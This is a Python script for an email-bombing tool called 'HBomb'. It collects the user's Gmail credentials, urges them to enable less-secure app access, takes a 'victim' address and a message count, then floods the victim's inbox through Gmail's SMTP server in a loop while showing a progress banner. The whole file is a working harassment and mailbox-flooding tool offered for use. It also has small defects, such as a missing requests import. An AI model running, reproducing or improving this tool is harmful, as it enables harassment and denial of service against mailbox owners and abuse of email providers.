import smtplib
import sys
import os
import subprocess

Red = '\033[1;31m'
Blue= '\033[1;36m'
Endc = '\033[0m'
verl = open(".version", 'r').read()

def checkinternet():
    res = False
    try:
        requests.get('https://www.google.com', verify=True)
        res = False
    except Exception:
        res = True
    if res:
        print("\n\n\tYour Internet Speed is Slow or You Are Using Proxies...")
        print('\t\tHBomb Will Stop Now...\n\n')

        banner()
        exit()

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():
    
    clr()
    logo="""
 ██░ ██  ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   
▓██░ ██▒▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
▒██▀▀██░▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██
░▓█ ░██ ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  
░▓█▒░██▓░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
 ▒ ░░▒░▒░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
 ▒ ░▒░ ░▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
 ░  ░░ ░ ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░ 
 ░  ░  ░ ░          ░ ░         ░    ░      
              ░                           ░
               ""","""
----------------   --------------------
| KLS  Project |   | Version : """,verl,""" |
----------------   --------------------
\tCreated by Honey Pots...
-------------------------------------------- 
"""
    print(Red+logo[0]+Blue+logo[1]+logo[2]+logo[3])


def mail():
    print(Red+ "\t\tMail Bombing \n" +Blue)
    SG0 = input("Enter your gmail address : " )
    SG = SG0.strip()
    while "@gmail.com" != SG[-10:] :
        SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
    while int(len(SG)) < 10 : 
        SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
    Er = input("\n\nPlease check your \"Less secure app access turn off\" \n\n\tOtherwise it give you error \n\nVisit : https://myaccount.google.com/lesssecureapps : ")
    pws = input("\nEnter your gmail password : ")
    RG = str(input("Enter Victim Mail address : "))
    num = input("Enter Number of Mail : ")
    while num == '':
        num = input("Please Enter Number of Mail : ")

    while num.isdigit() != True:
        num = input("\aInvalid! Please Enter Number of Mail : ")

    mail = int(num) + 1
    print("\n\t\t Please Wait Bombing Start...")
    connection = smtplib.SMTP('smtp.gmail.com', 587)
    connection.ehlo()
    connection.starttls()
    connection.login(SG , pws)
    for a in range(1, int(mail)) :
        connection.sendmail(SG, RG, "Subject:shopping \n\n .... ")

        clr()
        banner()
        print(Blue)
        print("-------------------------------------------- ")
        print(Red +"                  Details "+Blue)
        print(" Target Mail             : ",RG)
        print(" Number of Requests Sent : ",num)
        print(" Successful Requests     : ",a)
        print(" Failed Requests         : ",0)
        print("-------------------------------------------- ")
        print("            Bombing In Progress")
    clr()
    banner() 
    print(str(num) + " Mail Send Successful To  " + str(RG))
    input("\n\nPress Enter To Run Again HBomb Tool : ")  
    subprocess.call([sys.executable, 'HBomb.py'])      
banner()

mail()